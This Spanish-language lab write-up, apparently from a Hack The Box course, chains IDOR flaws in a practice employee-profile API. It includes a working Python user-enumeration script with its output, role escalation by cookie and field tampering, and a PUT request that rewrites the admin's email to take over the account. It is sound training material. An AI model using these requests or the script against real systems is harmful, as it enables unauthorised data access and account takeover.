
# Encadenar vulnerabilidades IDOR

Por lo general, una solicitud `GET` al punto final de la API debe devolver los detalles del usuario solicitado, por lo que podemos intentar llamarlo para ver si podemos recuperar los detalles de nuestro usuario. También notamos que después de que se carga la página, obtiene los detalles del usuario con una solicitud `GET` al mismo punto final de la API:&#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_api.jpg" alt=""><figcaption></figcaption></figure>

Como se mencionó en la sección anterior, la única forma de autorización en nuestras solicitudes HTTP es la cookie `role=employee`, ya que la solicitud HTTP no contiene ninguna otra forma de autorización específica del usuario, como un token JWT, por ejemplo. Incluso si existiera un token, a menos que un sistema de control de acceso de back-end lo estuviera comparando activamente con los detalles del objeto solicitado, aún podríamos recuperar los detalles de otros usuarios.

***

## <mark style="color:purple;">Divulgación de información</mark>

Enviemos una solicitud `GET` con otro `uid`:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg)

Como podemos ver, esto devolvió los detalles de otro usuario, con sus propios `uuid` y `role`, confirmando una vulnerabilidad `IDOR Information Disclosure`:

```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```

Esto nos proporciona nuevos detalles, especialmente el `uuid`, que antes no podíamos calcular y, por lo tanto, no podíamos cambiar los detalles de otros usuarios.

***

## <mark style="color:purple;">Modificar los datos de otros usuarios</mark>

Ahora, con el usuario `uuid` en mano, podemos cambiar los detalles de este usuario enviando una solicitud `PUT/profile/api.php/profile/2` con los detalles anteriores junto con cualquier modificación que hayamos realizado, de la siguiente manera:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg)

Esta vez no recibimos ningún mensaje de error de control de acceso, y cuando intentamos acceder por `GET` a los detalles del usuario nuevamente, vemos que efectivamente actualizamos sus datos:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg)

Además de permitirnos ver detalles potencialmente confidenciales, la capacidad de modificar los detalles de otro usuario también nos permite realizar otros ataques. Un tipo de ataque consiste en modificar la dirección de correo electrónico de un usuario y luego solicitar un enlace para restablecer la contraseña, que se enviará a la dirección de correo electrónico que especificamos, lo que nos permitirá tomar control de su cuenta. Otro ataque potencial es colocar un payload XSS en el campo "acerca de", que se ejecutaría una vez que el usuario visite su página Editar perfil, lo que nos permitirá atacar al usuario de diferentes maneras.

***

## <mark style="color:purple;">Encadenamiento de 2 vulnerabilidades IDOR</mark>

Dado que hemos identificado una vulnerabilidad de divulgación de información de IDOR, también podemos enumerar a todos los usuarios y buscar otras funciones, idealmente una función de administrador. Intente escribir un script para enumerar a todos los usuarios, de manera similar a lo que hicimos anteriormente.

Una vez que enumeremos todos los usuarios, encontraremos un usuario administrador con los siguientes detalles:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

Podemos modificar los datos del administrador y luego realizar uno de los ataques anteriores para tomar el control de su cuenta. Sin embargo, como ahora conocemos el nombre del rol de administrador (`web_admin`), podemos asignarlo a nuestro usuario para poder crear nuevos usuarios o eliminar usuarios actuales. Para ello, interceptaremos la solicitud cuando hagamos clic en el botón `Update profile` y cambiaremos nuestro rol a `web_admin`:

![modificar\_nuestro\_rol](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg)

Esta vez, no recibimos el mensaje de error `Invalid role` ni tampoco ningún mensaje de error de control de acceso, lo que significa que no hay medidas de control de acceso de back-end sobre qué roles podemos establecer para nuestro usuario. Si ingresamos por `GET` nuestros detalles de usuario, vemos que efectivamente se ha establecido el `role` en `web_admin`:

```json
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

Ahora, podemos actualizar la página para actualizar nuestra cookie, o configurarla manualmente como `Cookie: role=web_admin`, y luego interceptar la solicitud `Update` para crear un nuevo usuario y ver si se nos permite hacerlo:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)

Esta vez no recibimos ningún mensaje de error. Si enviamos una solicitud `GET` para el nuevo usuario, vemos que se ha creado correctamente:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg)

Al combinar la información que obtuvimos una `IDOR Information Disclosure vulnerability` con un ataque a un punto final de API `IDOR Insecure Function Calls`, pudimos modificar los detalles de otros usuarios y crear o eliminar usuarios mientras eludíamos varios controles de acceso establecidos. En muchas ocasiones, la información que filtramos a través de vulnerabilidades de IDOR se puede utilizar en otros ataques, como IDOR o XSS, lo que da lugar a ataques más sofisticados o eludir los mecanismos de seguridad existentes.

Con nuestro nuevo `role`, también podemos realizar asignaciones masivas para cambiar campos específicos para todos los usuarios, como colocar payloads XSS en sus perfiles o cambiar su correo electrónico a un correo electrónico que especifiquemos. Intente escribir un script que cambie el correo electrónico de todos los usuarios a un correo electrónico que usted elija. Puede hacerlo recuperando sus `uuids` y luego enviando una solicitud PUT para cada uno con el nuevo correo electrónico.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.60.154:40673
```

Intente cambiar el correo electrónico del administrador a ' `flag@idor.htb` ' y debería aparecer la flag en la página 'Edit profile'. No olvides configurar el UUID correcto del administrador.

<figure><img src="/files/l5NwTsBjJbj22LgPtPb4" alt=""><figcaption></figcaption></figure>

### Script de enumeración

Lo primero vamos a crear un script en python para enumerar todos los empleados del site:

```python
import requests
import json

# Configuración
url = "http://94.237.60.154:40673/profile/api.php/profile/"
cookies = {'role': 'employee'}
headers = {
    "Content-Type": "application/json",
    "Referer": "http://94.237.60.154:40673/profile/index.php"
}
output_file = "users.txt"

# Rango de IDs
start_id = 1
end_id = 100

print("[+] Enumerando usuarios...")
with open(output_file, "w") as f:
    for uid in range(start_id, end_id + 1):
        print(f"[+] Intentando recuperar detalles del usuario con uid={uid}...")
        try:
            response = requests.get(f"{url}{uid}", cookies=cookies, headers=headers, timeout=5)
            if response.status_code == 200 and "uuid" in response.text:
                print(f"[+] Usuario encontrado: {response.json()}")
                json.dump(response.json(), f, indent=4)
                f.write("\n")
            else:
                print(f"[-] Usuario con uid={uid} no encontrado o acceso denegado.")
        except requests.RequestException as e:
            print(f"[!] Error con uid={uid}: {e}")

print(f"[+] Enumeración completa. Usuarios guardados en {output_file}")
```

Lo ejecutamos y nos guarda todos los usuarios en un archivo de texto:

```shell-session
afsh4ck@kali$ python3 brute-users.py
[+] Enumerando usuarios...
[+] Intentando recuperar detalles del usuario con uid=1...
[+] Usuario encontrado: {'uid': '1', 'uuid': '40f5888b67c748df7efba008e7c2f9d2', 'role': 'employee', 'full_name': 'Amy Lindon', 'email': 'a_lindon@employees.htb', 'about': 'A Release is like a boat. 80% of the holes plugged is not good enough.'}
[+] Intentando recuperar detalles del usuario con uid=2...
[+] Usuario encontrado: {'uid': '2', 'uuid': '4a9bd19b3b8676199592a346051f950c', 'role': 'employee', 'full_name': 'Iona Franklyn', 'email': 'i_franklyn@employees.htb', 'about': 'It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it.'}pr
[+] Intentando recuperar detalles del usuario con uid=3...
[+] Usuario encontrado: {'uid': '3', 'uuid': '771409a8fb1543788fe7d91f1ea0987f', 'role': 'employee', 'full_name': 'Ardith Bloxham', 'email': 'a_bloxham@employees.htb', 'about': 'A fool with a tool is still a fool. Always have a goal, a plan & the tool as the enabler.'}
[+] Intentando recuperar detalles del usuario con uid=4...
[+] Usuario encontrado: {'uid': '4', 'uuid': '1a1f289428bd7ab3beb8a89d4c90b22f', 'role': 'employee', 'full_name': 'Lela Symons', 'email': 'l_symons@employees.htb', 'about': 'When working for IT Security, you are only one Incident away from being the most important group in IT.'}
[+] Intentando recuperar detalles del usuario con uid=5...
[+] Usuario encontrado: {'uid': '5', 'uuid': 'eb4fe264c10eb7a528b047aa983a4829', 'role': 'employee', 'full_name': 'Callahan Woodhams', 'email': 'c_woodhams@employees.htb', 'about': "I don't like quoting others!"}
[+] Intentando recuperar detalles del usuario con uid=6...
[+] Usuario encontrado: {'uid': '6', 'uuid': 'cb67c3ae286e9140355eb56d2c33ff5b', 'role': 'employee', 'full_name': 'Roscoe Alden', 'email': 'r_alden@employees.htb', 'about': "Security is always excessive until it's not enough."}
[+] Intentando recuperar detalles del usuario con uid=7...
[+] Usuario encontrado: {'uid': '7', 'uuid': '63d9b90d9808e4ddc24c2331ddd6775d', 'role': 'employee', 'full_name': 'Marsha Pierce', 'email': 'm_pierce@employees.htb', 'about': "Security used to be an inconvenience sometimes, but now it's a necessity all the time."}
[+] Intentando recuperar detalles del usuario con uid=8...
[+] Usuario encontrado: {'uid': '8', 'uuid': 'deb77b7fcd6ee6af0b2c992355eaeea9', 'role': 'employee', 'full_name': 'George Fleming', 'email': 'g_fleming@employees.htb', 'about': 'IT Security is a form of Problem Management. It looks to proactively prevent Incidents.'}
[+] Intentando recuperar detalles del usuario con uid=9...
[+] Usuario encontrado: {'uid': '9', 'uuid': 'ca7724498403de38829ae36fc9149b75', 'role': 'employee', 'full_name': 'Augusta Edwardson', 'email': 'a_edwardson@employees.htb', 'about': 'Simplicity is the ultimate sophistication.'}
[+] Intentando recuperar detalles del usuario con uid=10...
[+] Usuario encontrado: {'uid': '10', 'uuid': 'bfd92386a1b48076792e68b596846499', 'role': 'staff_admin', 'full_name': 'admin', 'email': 'admin@employees.htb', 'about': 'Never gonna give you up, Never gonna let you down'}
[+] Intentando recuperar detalles del usuario con uid=11...
[-] Usuario con uid=11 no encontrado o acceso denegado.
[+] Intentando recuperar detalles del usuario con uid=12...
[-] Usuario con uid=12 no encontrado o acceso denegado.
<----SNIP---->
[+] Intentando recuperar detalles del usuario con uid=99...
[-] Usuario con uid=99 no encontrado o acceso denegado.
[+] Intentando recuperar detalles del usuario con uid=100...
[-] Usuario con uid=100 no encontrado o acceso denegado.
[+] Enumeración completa. Usuarios guardados en users.txt
```

### Usuarios del site

```bash
cat users.txt 
{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
{
    "uid": "3",
    "uuid": "771409a8fb1543788fe7d91f1ea0987f",
    "role": "employee",
    "full_name": "Ardith Bloxham",
    "email": "a_bloxham@employees.htb",
    "about": "A fool with a tool is still a fool. Always have a goal, a plan & the tool as the enabler."
}
{
    "uid": "4",
    "uuid": "1a1f289428bd7ab3beb8a89d4c90b22f",
    "role": "employee",
    "full_name": "Lela Symons",
    "email": "l_symons@employees.htb",
    "about": "When working for IT Security, you are only one Incident away from being the most important group in IT."
}
{
    "uid": "5",
    "uuid": "eb4fe264c10eb7a528b047aa983a4829",
    "role": "employee",
    "full_name": "Callahan Woodhams",
    "email": "c_woodhams@employees.htb",
    "about": "I don't like quoting others!"
}
{
    "uid": "6",
    "uuid": "cb67c3ae286e9140355eb56d2c33ff5b",
    "role": "employee",
    "full_name": "Roscoe Alden",
    "email": "r_alden@employees.htb",
    "about": "Security is always excessive until it's not enough."
}
{
    "uid": "7",
    "uuid": "63d9b90d9808e4ddc24c2331ddd6775d",
    "role": "employee",
    "full_name": "Marsha Pierce",
    "email": "m_pierce@employees.htb",
    "about": "Security used to be an inconvenience sometimes, but now it's a necessity all the time."
}
{
    "uid": "8",
    "uuid": "deb77b7fcd6ee6af0b2c992355eaeea9",
    "role": "employee",
    "full_name": "George Fleming",
    "email": "g_fleming@employees.htb",
    "about": "IT Security is a form of Problem Management. It looks to proactively prevent Incidents."
}
{
    "uid": "9",
    "uuid": "ca7724498403de38829ae36fc9149b75",
    "role": "employee",
    "full_name": "Augusta Edwardson",
    "email": "a_edwardson@employees.htb",
    "about": "Simplicity is the ultimate sophistication."
}
{
    "uid": "10",
    "uuid": "bfd92386a1b48076792e68b596846499",
    "role": "staff_admin",
    "full_name": "admin",
    "email": "admin@employees.htb",
    "about": "Never gonna give you up, Never gonna let you down"
}
```

### Usuario administrador

Encontramos al usuario administrador, que es el que nos interesa:

```bash
{
    "uid": "10",
    "uuid": "bfd92386a1b48076792e68b596846499",
    "role": "staff_admin",
    "full_name": "admin",
    "email": "admin@employees.htb",
    "about": "Never gonna give you up, Never gonna let you down"
}
```

### **Cambiar el correo electrónico del administrador**

Envíamos una solicitud `PUT` al endpoint `/profile/api.php/profile/10` con los datos del administrador, pero cambiando el campo `email` a `flag@idor.htb`.

```http
PUT /profile/api.php/profile/10 HTTP/1.1
Host: 94.237.60.154:40673
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Content-Type: application/json
Cookie: role=employee
Connection: keep-alive
Content-Length: 208

{
    "uid": "10",
    "uuid": "bfd92386a1b48076792e68b596846499",
    "role": "staff_admin",
    "full_name": "admin",
    "email": "flag@idor.htb",
    "about": "Never gonna give you up, Never gonna let you down"
}
```

Al enviar la petición por BurpSuite vemos que funciona y nos devuelve la flag:

<figure><img src="/files/KIgru8xwe4QMgwbEWURD" alt=""><figcaption></figcaption></figure>

Si hacemos una solicitud `GET` de este usuario admin vemos que se ha cambiado correctamente su email:

<figure><img src="/files/BwUtXWpVyDYhlZqXKGxw" alt=""><figcaption></figcaption></figure>
